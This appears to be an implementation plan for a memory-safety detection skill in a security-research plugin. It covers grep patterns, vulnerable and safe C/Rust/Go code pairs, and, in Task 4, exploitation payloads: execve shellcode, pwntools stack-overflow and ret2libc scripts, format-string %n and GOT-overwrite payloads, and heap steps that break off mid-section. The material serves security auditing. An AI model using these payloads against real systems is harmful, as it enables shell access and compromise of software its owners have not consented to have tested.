# detect-memory Skill Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Create a comprehensive `detect-memory` skill for the security-research plugin that detects memory safety vulnerabilities across all languages and guides exploitation chain construction, then remove the overlapping memory content from `detect-injection`.

**Architecture:** New skill follows the exact detect-* template (SKILL.md + references/ directory). Content is based on the design spec at `docs/superpowers/specs/2026-04-02-detect-memory-design.md` and quality modeled after reference advisories in `mem_ref/REF1.md` and `mem_ref/REF2.md`.

**Tech Stack:** Markdown skill files, grep patterns, pwntools exploit templates

---

### Task 1: Create detect-memory SKILL.md

**Files:**
- Create: `plugins/security-research/skills/detect-memory/SKILL.md`

- [ ] **Step 1: Create the skill directory**

```bash
mkdir -p plugins/security-research/skills/detect-memory/references
```

- [ ] **Step 2: Write SKILL.md**

Write the file `plugins/security-research/skills/detect-memory/SKILL.md` with the following complete content:

````markdown
---
name: detect-memory
description: >-
  Detect memory safety vulnerabilities across all languages — buffer overflow,
  use-after-free, double free, invalid free, type confusion, integer overflow,
  uninitialized memory, format string, OOB read/write, and unsafe language bindings
  (C/C++, Rust unsafe, Go cgo, Python ctypes, Java JNI, Node.js N-API).
  Includes exploitation chain construction with multi-allocator tactics.
argument-hint: "<target_source> <audit_dir>"
user-invocable: false
---

# Memory Safety Vulnerability Detection

## Goal

Identify memory safety vulnerabilities in compiled code and unsafe language bindings. Trace bugs to exploitation primitives (arbitrary read/write, info leak, control flow hijack). Guide exploitation chain construction through allocator-specific tactics.

## Learned Techniques

Before starting, read `references/cool_techniques.md` in this skill's directory. If it contains entries, apply those learned detection patterns during your analysis. These are techniques that proved effective in prior audits.

## Coverage

| Category | Sub-types |
|----------|-----------|
| **Stack Buffer Overflow** | strcpy/strcat/gets/sprintf, stack-based OOB write, VLA overflow |
| **Heap Buffer Overflow** | malloc+memcpy OOB, off-by-one heap, chunk metadata corruption |
| **Use-After-Free** | dangling pointer deref, UAF in error paths, iterator invalidation UAF |
| **Double Free** | explicit double free, error-path double free, conditional double free |
| **Invalid/Arbitrary Free** | free of stack/global pointer, free of attacker-controlled address, deserialization-path free |
| **Type Confusion** | void* cast mismatch, union type punning, polymorphic object confusion |
| **Integer Overflow/Underflow** | size calc overflow → undersized alloc, signed/unsigned comparison |
| **Uninitialized Memory** | stack var read before write, heap alloc without zeroing, partial struct init |
| **Format String** | printf with user-controlled format, syslog format injection |
| **Out-of-Bounds Read** | strlen on non-NUL-terminated buffer, array index OOB read (info leak) |
| **Unsafe Language Bindings** | Rust `unsafe {}`, Go cgo/`unsafe.Pointer`, Python ctypes/C extensions, Java JNI/Unsafe, Ruby C extensions, Node.js N-API/native addons |
| **Allocator-Specific Exploitation** | glibc ptmalloc (tcache/fastbin/unsorted bin), jemalloc (runs/tcache), musl-malloc, Windows heap (LFH/segment heap), V8/Go runtime allocators |

## Grep Patterns

### Dangerous Functions (C/C++)
```bash
# Unbounded copy/format functions — immediate buffer overflow risk
grep -rn "strcpy(\|strcat(\|gets(\|sprintf(\|vsprintf(\|strncpy(" --include="*.c" --include="*.cpp" --include="*.h" ${TARGET_SOURCE}

# Format string sinks — check if format arg is user-controlled
grep -rn "printf(\|fprintf(\|syslog(\|snprintf(" --include="*.c" --include="*.cpp" ${TARGET_SOURCE}

# Allocation/deallocation — trace lifecycle for UAF, double free, leak
grep -rn "\bmalloc(\|\bcalloc(\|\brealloc(\|\bfree(" --include="*.c" --include="*.cpp" --include="*.h" ${TARGET_SOURCE}

# C++ delete — same lifecycle concerns as free()
grep -rn "\bdelete\b\|\bdelete\[\]" --include="*.cpp" --include="*.h" ${TARGET_SOURCE}
```

### Allocation Size Calculations
```bash
# Multiplication in malloc arg — integer overflow risk
grep -rn "malloc(.*\*\|calloc(.*," --include="*.c" --include="*.cpp" ${TARGET_SOURCE}

# realloc — check for overflow in new size, and use-after-realloc if ptr changes
grep -rn "realloc(.*," --include="*.c" --include="*.cpp" ${TARGET_SOURCE}
```

### Free + Use Patterns (UAF/Double Free)
```bash
# free() without immediate NULL assignment — potential UAF
grep -rn "free(" --include="*.c" --include="*.cpp" -A5 ${TARGET_SOURCE} | grep -v "= NULL"

# C++ delete without nulling — same risk
grep -rn "delete " --include="*.cpp" -A5 ${TARGET_SOURCE}
```

### Error Path Cleanup
```bash
# goto-based error handling — audit every label for correct cleanup
grep -rn "goto\s\+\(err\|fail\|cleanup\|out\|error\|done\)" --include="*.c" --include="*.cpp" ${TARGET_SOURCE}

# Early return after error check — does cleanup happen before return?
grep -rn "if.*err\|if.*fail\|if.*<\s*0" --include="*.c" --include="*.cpp" -A10 ${TARGET_SOURCE}
```

### Unsafe Language Bindings
```bash
# Rust unsafe blocks — raw pointer ops, transmute, from_raw_parts
grep -rn "unsafe {" --include="*.rs" ${TARGET_SOURCE}

# Go cgo and unsafe.Pointer — pointer passing rule violations
grep -rn "unsafe\.Pointer\|C\.\|cgo" --include="*.go" ${TARGET_SOURCE}

# Python ctypes/cffi — buffer sizing, cast, string_at
grep -rn "ctypes\.\|cffi\.\|from ctypes" --include="*.py" ${TARGET_SOURCE}

# Java JNI — GetByteArrayElements lifecycle, critical sections
grep -rn "JNIEnv\|GetByteArrayElements\|ReleasePrimitiveArrayCritical" --include="*.java" --include="*.c" ${TARGET_SOURCE}

# Node.js N-API — buffer lifecycle, prevent GC bugs
grep -rn "napi_\|Napi::" --include="*.cc" --include="*.cpp" --include="*.h" ${TARGET_SOURCE}

# Ruby C extensions — string pointer access, Data_Get_Struct
grep -rn "rb_str_new\|RSTRING_PTR\|Data_Get_Struct" --include="*.c" --include="*.h" ${TARGET_SOURCE}
```

### Memory-Mapped I/O and Shared Memory
```bash
# mmap/shm — shared memory regions with potential race conditions
grep -rn "mmap(\|munmap(\|shm_open(" --include="*.c" --include="*.cpp" ${TARGET_SOURCE}
```

### Format String Sinks (Non-Literal Format)
```bash
# printf-family calls where format string is NOT a literal — format string vuln
grep -rn "printf(\|fprintf(\|syslog(\|err(\|warn(" --include="*.c" --include="*.cpp" ${TARGET_SOURCE} | grep -v '"%'
```

### Struct/Object Initialization
```bash
# Struct declarations without zeroing — uninitialized memory read risk
grep -rn "struct.*{" --include="*.c" --include="*.cpp" -A3 ${TARGET_SOURCE} | grep -v "= {0}\|= {}\|memset\|bzero"
```

### Cross-Module Boundaries
```bash
# Dynamic loading — plugin/module interfaces where type safety breaks down
grep -rn "dlopen\|dlsym\|LoadLibrary\|GetProcAddress" --include="*.c" --include="*.cpp" ${TARGET_SOURCE}

# Framework-specific module APIs — high-value boundary for type confusion
grep -rn "RedisModule_\|PyArg_Parse\|napi_get_cb_info" ${TARGET_SOURCE}
```

### Serialization/Deserialization (High-Value Targets)
```bash
# RDB/protobuf/msgpack load — attacker-controlled sizes and pointers
grep -rn "LoadFromRDB\|LoadStringBuffer\|RdbLoad\|Deserializ" --include="*.c" --include="*.cpp" ${TARGET_SOURCE}

# Binary protocol parsing — length-prefix reads
grep -rn "read_uint32\|ntohl\|ntohs\|le32toh" --include="*.c" --include="*.cpp" ${TARGET_SOURCE}
```

## Detection Process

1. **Binary/Module Inventory** — Identify all compiled binaries, shared libraries (.so/.dll/.dylib), native extensions. For each, catalog: language, compiler, target architecture, and hardening properties (PIE, NX, stack canary, RELRO, CFI). Use `checksec`, `readelf -l`, or `otool -h`.

2. **Dangerous Function Scan** — Run the grep patterns above. Prioritize:
   - Functions with NO bounds checking (strcpy, gets, sprintf) → immediate triage
   - Functions with user-controlled size args (memcpy, realloc) → trace size source
   - Format string sinks with non-literal format args → confirm user control

3. **Allocation-Use-Free Lifecycle Tracing** — For each allocation site found, use LSP `findReferences` and `callHierarchy` to trace the full lifecycle:
   - Where is memory allocated?
   - Where is it used (read/write)?
   - Where is it freed?
   - Is there a use-after-free gap? Missing free (leak)? Double free path?
   - Does realloc invalidate existing pointers?

4. **Integer Overflow in Size Calculations** — Trace user-controlled values into malloc/calloc/realloc size arguments. Check for:
   - Missing overflow guards on multiplication (`count * sizeof(T)`)
   - Implicit truncation (size_t → int → size_t)
   - Signed/unsigned comparison allowing negative bypass

5. **Cross-Module Boundary Analysis** — Identify where data crosses module/library boundaries (plugin APIs, FFI, shared memory, serialization/deserialization). These boundaries are where type confusion, size mismatches, and lifetime mismatches occur. Example: REF1 — TimeSeries OOB write corrupted adjacent Bloom heap structures across module boundary.

6. **Error Path Audit** — For each function with cleanup/goto labels, trace every error/early-return path:
   - Are all allocated resources freed exactly once?
   - Are freed pointers set to NULL or made unreachable?
   - Is state consistent on error return?
   - Do error paths free pointers that haven't been initialized yet?
   Example: REF2 — TopK `TopKRdbLoad()` error path freed attacker-controlled pointers from the heap blob because items were loaded AFTER the blob.

7. **Unsafe Language Binding Audit** — For non-C/C++ codebases:
   - **Rust:** audit all `unsafe {}` blocks for raw pointer arithmetic, transmute, `slice::from_raw_parts` with unchecked length, `ManuallyDrop` misuse
   - **Go:** audit cgo calls and `unsafe.Pointer` conversions for pointer passing rule violations, `C.CString` without `C.free`
   - **Python:** audit ctypes/cffi buffer handling for size mismatches, `string_at` without length
   - **Java:** audit JNI code for `GetByteArrayElements` without matching `Release`, critical section violations
   - **Node.js:** audit N-API/nan for buffer lifecycle and prevent GC-during-native-call bugs

8. **Exploitation Primitive Assessment** — For each confirmed vulnerability, classify the primitive it provides:
   - **Arbitrary write:** heap overflow overwriting adjacent structure fields (REF1: SBLink corruption), format string %n
   - **Arbitrary read:** OOB read (REF2: strlen on non-NUL-terminated buffer), format string %s/%x, UAF-to-string-read
   - **Arbitrary free:** error-path free of attacker-controlled pointer (REF2: TopK invalid free)
   - **Info leak:** stack/heap pointer leak for ASLR bypass, PIE base computation
   - **Control flow hijack:** function pointer overwrite (REF1: dictType.hashFunction), GOT overwrite (REF1: strstr@GOT), moduleType hijack (REF2: free → system)
   - Cross-reference with `references/exploitation.md` for allocator-specific chain construction.

## Confirmation Rules

| Pattern | Verdict |
|---------|---------|
| `strcpy(fixed_buf, user_str)` | CRITICAL — stack buffer overflow, RCE if canary absent |
| `malloc(user_len * elem_size)` without overflow check | HIGH — integer overflow → undersized heap alloc |
| `free(ptr); ... use(ptr)` with no NULL assignment between | HIGH — use-after-free |
| `free(ptr); ... free(ptr)` on any code path | HIGH — double free |
| `free(attacker_controlled_ptr)` | CRITICAL — arbitrary free primitive (REF2 pattern) |
| `printf(user_string)` | HIGH — format string (read/write primitive) |
| `memcpy(dst, src, user_len)` where dst is fixed-size | CRITICAL — heap overflow |
| `strlen(non_nul_terminated_buf)` | HIGH — OOB read / info leak (REF2 pattern) |
| `unsafe { *raw_ptr }` without bounds validation | HIGH — Rust unsafe OOB access |
| `C.GoString(cPtr)` without length limit | MEDIUM — Go cgo buffer overread |
| `strcpy` into stack buffer with canary + ASLR + PIE | MEDIUM — exploitable but requires info leak chain |
| Error-path free before pointer initialized | CRITICAL — arbitrary free if attacker controls initial value |
| RDB/deserialize load of pointer then error cleanup | CRITICAL — invalid free of attacker pointer (REF2 pattern) |
| `malloc(n); memset(buf, 0, n)` | FALSE POSITIVE — properly initialized |
| `free(ptr); ptr = NULL;` | FALSE POSITIVE — safe UAF prevention |
| `snprintf(buf, sizeof(buf), "%s", input)` | FALSE POSITIVE — bounds-checked |
| `calloc(count, sizeof(T))` | FALSE POSITIVE — calloc checks overflow internally |
| `ReplyWithStringBuffer(ctx, str, len)` | FALSE POSITIVE — length-aware, no strlen |

## LSP Integration

- `mcp__ide__getDiagnostics` for type checking and compiler warnings (especially `-Wall -Wextra -Wuninitialized`)
- `findReferences` for tracking pointer/buffer usage across functions — essential for allocation lifecycle tracing
- `goToDefinition` for custom allocator wrappers (`zmalloc`, `xmalloc`, `TOPK_CALLOC`) and custom free functions (`TopK_Destroy`, `freeModuleObject`)
- `callHierarchy` for tracing allocation → use → free chains across call boundaries
- Use LSP to resolve typedef chains (e.g., `RSTRING_PTR` → actual `char*` access, `HeapBucket` → struct layout)
- Identify custom allocator wrappers and determine if they add safety (zeroing, overflow checks) or just forward to malloc/free
- Trace object lifecycle through constructor/destructor pairs (C++ RAII, Rust Drop, Go finalizers)

## Beyond Pattern Matching — Semantic Analysis

### Custom Allocator Analysis
Many projects wrap malloc/free. Identify wrappers (`zmalloc`, `xmalloc`, `g_malloc`, `PyMem_Malloc`, `TOPK_CALLOC`, `RedisModule_Alloc`) and treat them as allocation sites. Check if wrappers add safety (zeroing, overflow checks) or just forward. Example: Redis uses `zmalloc`/`zfree` — these are thin wrappers that don't add bounds checking.

### Object Lifecycle State Machines
For complex objects (connection handles, file descriptors, module contexts, TopK structs), model the state machine: ALLOCATED → INITIALIZED → IN_USE → FREED. Verify all transitions are valid and no state is skipped. Pay special attention to partial initialization before error exits.

### Serialization/Deserialization Boundaries
RDB load, protobuf decode, JSON parse into native structs — these are high-value targets where attacker-controlled data directly influences allocation sizes and pointer values. The error path during deserialization is the #1 source of invalid free bugs (REF2: `TopKRdbLoad()` freed attacker-controlled pointers because the heap blob was loaded before item strings).

Key questions for every deserialization function:
- What happens if the stream ends mid-parse?
- Are pointers initialized before the error cleanup path?
- Can the attacker control the SIZE of allocations?
- Can the attacker control the CONTENTS that become pointers?

### Heap Layout Reasoning
When assessing exploitability, reason about heap adjacency:
- Which allocations are the same size class (jemalloc: 16/32/48/64/..., ptmalloc: fastbin sizes)?
- What structures could be corrupted by an N-byte overflow?
- Can the attacker control which allocation lands adjacent to the vulnerable buffer?
- Example: REF1 — TS samples buffer (64B) and BF SBLink (same jemalloc size class) were groomed to be adjacent.

### Cross-Language Boundary Semantics
At FFI boundaries, check:
- **Who owns the memory?** C allocates, does the GC-managed language know to free it?
- **When is it freed?** Can the GC collect the wrapper while C still holds a pointer?
- **Copy or alias?** If the binding aliases C memory, the GC can't move it (Go's pointer passing rules exist for this reason).
- **Lifetime communication:** Does the binding use ref-counting, Release calls, or Drop impls to signal end-of-use?

### Domain-Specific Deep Analysis
- **Redis modules:** `RedisModule_LoadStringBuffer()` returns non-NUL-terminated strings. Any code passing these to `strlen`/`CString` functions has an OOB read (REF2 pattern).
- **Plugin/extension APIs:** Check if the host application's API makes safety guarantees (thread safety, lifetime management) and whether the plugin respects them.
- **Memory-mapped file handling:** `mmap` regions can be modified by external processes — TOCTOU on mmap'd data is a real attack surface.

## Reference Files

- `references/patterns.md` — Vulnerable vs. safe code patterns per language for each vulnerability class
- `references/payloads.md` — Exploitation payloads: shellcode, ROP, format string, heap allocator-specific primitives
- `references/exploitation.md` — Full exploitation chain construction guide (binary hardening → info leak → heap grooming → primitive escalation → control flow hijack → RCE)
- `references/cool_techniques.md` — Techniques learned from prior audits (populated by `/security-research:capture-technique`)
````

- [ ] **Step 3: Commit**

```bash
git add plugins/security-research/skills/detect-memory/SKILL.md
git commit -m "feat(security-research): add detect-memory skill for memory safety vulnerability detection"
```

---

### Task 2: Create references/cool_techniques.md

**Files:**
- Create: `plugins/security-research/skills/detect-memory/references/cool_techniques.md`

- [ ] **Step 1: Write cool_techniques.md**

Write the file `plugins/security-research/skills/detect-memory/references/cool_techniques.md`:

```markdown
# Cool Techniques — Memory Safety Detection
<!-- Techniques are added by /security-research:capture-technique -->
```

- [ ] **Step 2: Commit**

```bash
git add plugins/security-research/skills/detect-memory/references/cool_techniques.md
git commit -m "feat(security-research): add cool_techniques.md for detect-memory"
```

---

### Task 3: Create references/patterns.md

**Files:**
- Create: `plugins/security-research/skills/detect-memory/references/patterns.md`

- [ ] **Step 1: Write patterns.md**

Write the file `plugins/security-research/skills/detect-memory/references/patterns.md` with the following complete content. This file contains vulnerable vs. safe code patterns organized by vulnerability class and language:

````markdown
# Memory Safety — Vulnerable Code Patterns

## 1. Stack Buffer Overflow

### C/C++ — strcpy with fixed buffer
**Vulnerable:**
```c
void handle_username(char *input) {
    char buf[64];
    strcpy(buf, input);  // overflow if input > 63 bytes
}
```

**Vulnerable — gets() (never safe):**
```c
char name[32];
gets(name);  // reads until newline with NO length limit
```

**Vulnerable — sprintf into fixed buffer:**
```c
char path[256];
sprintf(path, "/var/www/uploads/%s", filename);  // overflow if filename > ~240 bytes
```

**Safe alternatives:**
```c
strncpy(buf, input, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
strlcpy(buf, input, sizeof(buf));  // BSD — returns total length needed
snprintf(path, sizeof(path), "/var/www/uploads/%s", filename);
fgets(name, sizeof(name), stdin);
```

### Variable-Length Array (VLA) overflow
**Vulnerable:**
```c
void process(int user_len) {
    char buf[user_len];  // stack alloc with attacker-controlled size
    read(fd, buf, 1024); // may exceed VLA size
}
```

**Safe:**
```c
if (user_len > MAX_ALLOWED || user_len <= 0) return ERROR;
char *buf = malloc(user_len);
if (!buf) return ERROR;
```

## 2. Heap Buffer Overflow

### malloc without overflow check on size
**Vulnerable:**
```c
int *records = malloc(count * sizeof(int));  // integer overflow wraps to small value
for (int i = 0; i < count; i++) {
    records[i] = read_record();  // writes past allocation
}
```

### memcpy with user-controlled length
**Vulnerable:**
```c
uint8_t *buf = malloc(256);
size_t data_len = *(uint32_t *)(pkt + 4);  // length from packet header
memcpy(buf, pkt + 8, data_len);  // data_len not checked against 256
```

**Safe:**
```c
if (count > SIZE_MAX / sizeof(int)) return ERROR_OVERFLOW;
int *records = calloc(count, sizeof(int));  // calloc checks overflow internally
if (!records) return ERROR_OOM;
```

### Off-by-one heap overflow
**Vulnerable:**
```c
char *dup = malloc(strlen(src));     // missing +1 for NUL terminator
strcpy(dup, src);                    // writes NUL one byte past allocation
```

**Safe:**
```c
char *dup = malloc(strlen(src) + 1);
strcpy(dup, src);
// or just use strdup(src)
```

## 3. Use-After-Free (UAF)

### Dangling pointer after free
**Vulnerable:**
```c
void process_request(struct request *req) {
    char *buf = malloc(req->size);
    if (parse_request(buf, req) < 0) {
        free(buf);  // falls through to use of buf
    }
    send_response(buf, req->size);  // UAF if parse_request failed
}
```

**Safe:**
```c
free(buf);
buf = NULL;  // null dereference instead of exploitable UAF
```

### Iterator invalidation UAF (C++)
**Vulnerable:**
```cpp
for (auto it = vec.begin(); it != vec.end(); ++it) {
    if (should_remove(*it)) {
        vec.erase(it);  // invalidates iterator
    }
    // *it is now a dangling reference
}
```

**Safe:**
```cpp
vec.erase(std::remove_if(vec.begin(), vec.end(), should_remove), vec.end());
```

### Error-path UAF
**Vulnerable:**
```c
int process(struct ctx *ctx) {
    ctx->buf = malloc(1024);
    if (init_step1(ctx) < 0) goto cleanup;
    if (init_step2(ctx) < 0) goto cleanup;
    return use_buf(ctx->buf);  // OK path
cleanup:
    free(ctx->buf);
    return -1;
    // ctx->buf is still non-NULL — caller may use it
}
```

## 4. Double Free

### Explicit double free
**Vulnerable:**
```c
if (do_work(buf) < 0) {
    free(buf);      // first free
    goto error;
}
return buf;
error:
    free(buf);      // second free — double free
    return NULL;
```

**Safe — single cleanup path:**
```c
int ret = do_work(buf);
done:
    free(buf);  // single free point
    return ret < 0 ? NULL : buf;
```

### Conditional double free
**Vulnerable:**
```c
free(ptr);
if (condition) {
    free(ptr);  // double free on this path
}
```

## 5. Invalid/Arbitrary Free

### Free of stack/global pointer
**Vulnerable:**
```c
char stack_buf[64];
char *p = stack_buf;
// ... later, if p reassigned conditionally:
free(p);  // freeing stack memory — heap corruption
```

### Deserialization-path free (REF2 pattern)
**Vulnerable:**
```c
// TopKRdbLoad() — heap blob loaded FIRST with attacker pointers
topk->heap = (HeapBucket *)LoadStringBuffer(io, &size);
// Item strings loaded SECOND — if error before overwriting bucket->item:
for (bucket = topk->heap; bucket < topk->heap + topk->k; ++bucket) {
    char *it = LoadStringBuffer(io, &size);  // ERROR HERE → errdefer
    bucket->item = it;
}
// Cleanup path frees attacker-controlled pointer values from heap blob:
for (i = 0; i < topk->k; i++) {
    if (topk->heap[i].item)
        TOPK_FREE(topk->heap[i].item);  // frees ATTACKER value
}
```

**Safe — zero-initialize before loading:**
```c
for (bucket = topk->heap; bucket < topk->heap + topk->k; ++bucket) {
    bucket->item = NULL;  // safe: free(NULL) is no-op
}
// Now load items — error cleanup only frees NULL
```

## 6. Type Confusion

### void* cast mismatch
**Vulnerable:**
```c
void process(void *data, int type) {
    if (type == TYPE_A) {
        struct typeA *a = (struct typeA *)data;  // no runtime check
        a->field_at_offset_16 = value;  // if data is actually typeB, wrong offset
    }
}
```

### Union type punning
**Vulnerable:**
```c
union {
    uint64_t as_int;
    double as_float;
    void *as_ptr;
} val;
val.as_int = user_input;
func(val.as_ptr);  // attacker controls pointer via integer
```

### C++ RTTI bypass
**Vulnerable:**
```cpp
Base *obj = get_object();
Derived *d = static_cast<Derived *>(obj);  // no runtime type check
d->derived_method();  // if obj is wrong type, vtable confusion
```

**Safe:**
```cpp
Derived *d = dynamic_cast<Derived *>(obj);
if (!d) return ERROR_TYPE_MISMATCH;
```

## 7. Integer Overflow

### Size calculation overflow
**Vulnerable:**
```c
size_t total = width * height * 4;  // overflow if width*height > SIZE_MAX/4
uint8_t *img = malloc(total);       // undersized allocation
```

**Safe — GCC/Clang builtin:**
```c
size_t total;
if (__builtin_mul_overflow(width, height, &total) ||
    __builtin_mul_overflow(total, 4, &total)) {
    return ERROR_OVERFLOW;
}
```

### Signed/unsigned comparison
**Vulnerable:**
```c
int user_len = atoi(input);  // can be negative
if (user_len < MAX_SIZE) {   // -1 < 4096 → true
    memcpy(dst, src, user_len);  // memcpy treats as huge size_t
}
```

**Safe:**
```c
int user_len = atoi(input);
if (user_len <= 0 || (size_t)user_len > MAX_SIZE) return ERROR;
```

## 8. Uninitialized Memory

### Stack variable read before write
**Vulnerable:**
```c
int status;
if (condition) {
    status = compute_status();
}
return status;  // uninitialized if !condition — leaks stack data
```

### Heap allocation without zeroing
**Vulnerable:**
```c
struct user *u = malloc(sizeof(*u));
u->name = strdup(name);
// u->role not set — contains heap garbage, may be a valid pointer
if (is_admin(u->role)) grant_access();
```

**Safe:**
```c
struct user *u = calloc(1, sizeof(*u));  // zeroed
// or: memset(u, 0, sizeof(*u));
```

### Partial struct initialization
**Vulnerable:**
```c
struct response resp = { .code = 200 };
// resp.body_ptr is uninitialized — may leak data if sent to client
send_response(&resp, sizeof(resp));
```

**Safe:**
```c
struct response resp = {0};  // zero-initialize all fields
resp.code = 200;
```

## 9. Format String

### printf with user-controlled format
**Vulnerable:**
```c
printf(user_message);      // %n writes, %x/%p reads stack
syslog(LOG_ERR, user_msg); // same risk
```

**Safe:**
```c
printf("%s", user_message);
syslog(LOG_ERR, "%s", user_msg);
```

## 10. Out-of-Bounds Read

### strlen on non-NUL-terminated buffer (REF2 pattern)
**Vulnerable:**
```c
// RedisModule_LoadStringBuffer returns non-NUL-terminated data
char *item = RM_LoadStringBuffer(io, &len);
// Later:
RedisModule_ReplyWithCString(ctx, item);  // calls strlen() — reads past allocation
```

**Safe:**
```c
RedisModule_ReplyWithStringBuffer(ctx, item, len);  // length-aware
```

### Array index out of bounds
**Vulnerable:**
```c
char *lookup_record(int user_index) {
    static char *records[MAX_RECORDS];
    return records[user_index];  // OOB if index unchecked
}
```

**Safe:**
```c
if (user_index < 0 || user_index >= MAX_RECORDS) return NULL;
return records[user_index];
```

## 11. Rust unsafe

### Raw pointer arithmetic
**Vulnerable:**
```rust
unsafe {
    *ptr.add(user_offset) = value;  // OOB write if user_offset >= buffer.len()
}
```

**Safe:**
```rust
if let Some(elem) = buffer.get_mut(user_offset) {
    *elem = value;
}
```

### transmute type confusion
**Vulnerable:**
```rust
unsafe {
    let obj: &ConcreteType = std::mem::transmute(raw_ptr);  // no type check
    obj.method();  // if raw_ptr is wrong type, UB
}
```

### slice::from_raw_parts with unchecked length
**Vulnerable:**
```rust
unsafe {
    let data = std::slice::from_raw_parts(ptr, user_len);  // OOB if user_len too large
}
```

**Safe:**
```rust
assert!(user_len <= actual_capacity);
let data = unsafe { std::slice::from_raw_parts(ptr, user_len) };
```

## 12. Go cgo

### unsafe.Pointer conversion
**Vulnerable:**
```go
// Violates Go pointer passing rules — Go GC may move the underlying data
p := unsafe.Pointer(&goSlice[0])
C.process_buffer((*C.char)(p), C.int(len(goSlice)))
```

### C.CString without C.free
**Vulnerable:**
```go
cstr := C.CString(goString)  // allocates C memory via malloc
C.use_string(cstr)
// missing: C.free(unsafe.Pointer(cstr)) — memory leak
```

### Pointer passing rule violations
**Vulnerable:**
```go
// Passing Go pointer to C that stores it beyond the call
var callback func()
C.register_callback(unsafe.Pointer(&callback))  // Go GC may collect callback
```

## 13. Python ctypes

### Buffer sizing mismatch
**Vulnerable:**
```python
buf = ctypes.create_string_buffer(64)
lib.read_data(buf, 1024)  # reads up to 1024 into 64-byte buffer
```

### ctypes.cast without validation
**Vulnerable:**
```python
ptr = ctypes.cast(user_addr, ctypes.POINTER(ctypes.c_char))
data = ptr[0:100]  # arbitrary read from user-controlled address
```

### string_at without length
**Vulnerable:**
```python
data = ctypes.string_at(ptr)  # reads until NUL — OOB if no NUL
```

**Safe:**
```python
data = ctypes.string_at(ptr, known_length)
```

## 14. Java JNI

### GetByteArrayElements without Release
**Vulnerable:**
```c
JNIEXPORT void JNICALL Java_Foo_process(JNIEnv *env, jobject obj, jbyteArray arr) {
    jbyte *data = (*env)->GetByteArrayElements(env, arr, NULL);
    process(data);
    // missing: (*env)->ReleaseByteArrayElements(env, arr, data, 0);
    // memory leak + potential GC issues
}
```

### Critical section violation
**Vulnerable:**
```c
jbyte *data = (*env)->GetPrimitiveArrayCritical(env, arr, NULL);
(*env)->CallVoidMethod(env, obj, mid);  // JNI call inside critical — may deadlock/crash
(*env)->ReleasePrimitiveArrayCritical(env, arr, data, 0);
```

## 15. Node.js N-API

### Buffer::New ownership confusion
**Vulnerable:**
```cpp
char *data = (char *)malloc(1024);
fill_data(data);
// Buffer::New takes ownership — but we might free data ourselves later
auto buf = Napi::Buffer<char>::New(env, data, 1024);
free(data);  // double free — Buffer will also free it
```

### GC during native call
**Vulnerable:**
```cpp
Napi::Value Process(const Napi::CallbackInfo& info) {
    char *raw = info[0].As<Napi::Buffer<char>>().Data();
    // ... long computation ...
    // GC may run during computation, collecting the Buffer
    // raw is now a dangling pointer
    return Napi::String::New(env, raw);  // UAF
}
```

**Safe:**
```cpp
Napi::Value Process(const Napi::CallbackInfo& info) {
    Napi::Buffer<char> buf = info[0].As<Napi::Buffer<char>>();
    Napi::Reference<Napi::Buffer<char>> ref = Napi::Persistent(buf);  // prevent GC
    char *raw = buf.Data();
    // ... computation ...
    return Napi::String::New(env, raw, buf.Length());
}
```
````

- [ ] **Step 2: Commit**

```bash
git add plugins/security-research/skills/detect-memory/references/patterns.md
git commit -m "feat(security-research): add memory safety vulnerable code patterns reference"
```

---

### Task 4: Create references/payloads.md

**Files:**
- Create: `plugins/security-research/skills/detect-memory/references/payloads.md`

- [ ] **Step 1: Write payloads.md**

Write the file `plugins/security-research/skills/detect-memory/references/payloads.md` with the following complete content:

````markdown
# Memory Safety — Exploitation Payloads

## 1. Stack Overflow Payloads

### Finding the Offset

**pwntools cyclic pattern:**
```python
from pwn import *
pattern = cyclic(500)
# Send pattern, get crash address
# offset = cyclic_find(0x61616175)  # x86
# offset = cyclic_find(core.read(core.rsp, 4))  # x86-64
```

**Metasploit pattern:**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x39614138
```

### Classic Stack Overflow — x86 (32-bit)
```python
from pwn import *

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

offset = 76
ret_addr = 0xffffd5a0  # address of shellcode on stack

payload = shellcode + b"A" * (offset - len(shellcode)) + p32(ret_addr)

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### x86-64 Shellcode
```python
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
```

### ROP Chain — ret2libc (x86-64)
```python
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x401233    # ROPgadget --binary ./vulnerable | grep "pop rdi"
ret     = 0x40101a    # stack alignment gadget

payload  = b"A" * 120
payload += p64(ret)          # align stack to 16 bytes
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)  # next(libc.search(b'/bin/sh\x00'))
payload += p64(system_addr)  # libc.sym['system']
```

## 2. Format String Payloads

### Read stack values
```
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
%6$x     -> sixth argument (direct parameter access)
%6$s     -> string at sixth argument address
%6$p     -> pointer at sixth argument (preferred — includes 0x prefix)
```

### Arbitrary write with %n
```python
target_addr = 0xdeadbeef
offset = 6  # position of our input on the stack
payload = p32(target_addr) + f"%{65 - 4}c%{offset}$n".encode()
```

### GOT overwrite via format string
```python
from pwn import *
writes = {elf.got['exit']: elf.sym['win_function']}
payload = fmtstr_payload(6, writes)
```

### Stack canary leak via format string
```python
p.sendline(b"%11$p")  # adjust offset to canary position
canary = int(p.recvline().strip(), 16)

payload  = b"A" * offset_to_canary
payload += p64(canary)
payload += b"B" * 8       # saved RBP
payload += p64(rop_chain)
```

## 3. Heap Exploitation — glibc ptmalloc

### tcache Poisoning (glibc < 2.32)
```python
# 1. alloc A, alloc B (same size class, e.g. 0x20)
# 2. free B → tcache[0x20]: B
# 3. free A → tcache[0x20]: A → B
# 4. UAF write A->fd = target_addr
# 5. alloc → gets A
